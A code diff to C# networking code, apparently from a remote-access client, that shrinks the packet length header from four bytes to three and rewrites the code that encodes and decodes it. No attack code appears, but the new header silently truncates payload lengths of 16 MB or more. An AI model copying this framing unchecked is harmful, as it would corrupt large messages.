@@ -149,7 +149,7 @@ namespace xClient.Core.Networking
         /// <summary>
         /// The header size in
         /// </summary>
-        public int HEADER_SIZE { get { return 4; } } // 4 Byte
+        public int HEADER_SIZE { get { return 3; } } // 3 Byte
 
         /// <summary>
         /// Returns an array containing all of the proxy clients of this client.
@@ -371,7 +371,7 @@ namespace xClient.Core.Networking
                                 {
                                     try
                                     {
-                                        _payloadLen = BitConverter.ToInt32(readBuffer, _readOffset);
+                                        _payloadLen = (int)readBuffer[_readOffset] | readBuffer[_readOffset + 1] << 8 | readBuffer[_readOffset + 2] << 16;
                                     }
                                     catch (Exception)
                                     {
@@ -549,11 +549,16 @@ namespace xClient.Core.Networking
                 if (encryptionEnabled)
                     payload = AES.Encrypt(payload, Encoding.UTF8.GetBytes(Settings.PASSWORD));
 
-                byte[] header = BitConverter.GetBytes(payload.Length);
+                byte[] header = new byte[]
+                {
+                    (byte)payload.Length,
+                    (byte)(payload.Length >> 8),
+                    (byte)(payload.Length >> 16)
+                };
 
-                byte[] data = new byte[payload.Length + 4];
+                byte[] data = new byte[payload.Length + HEADER_SIZE];
                 Array.Copy(header, data, header.Length);
-                Array.Copy(payload, 0, data, 4, payload.Length);
+                Array.Copy(payload, 0, data, HEADER_SIZE, payload.Length);
 
                 try
                 {
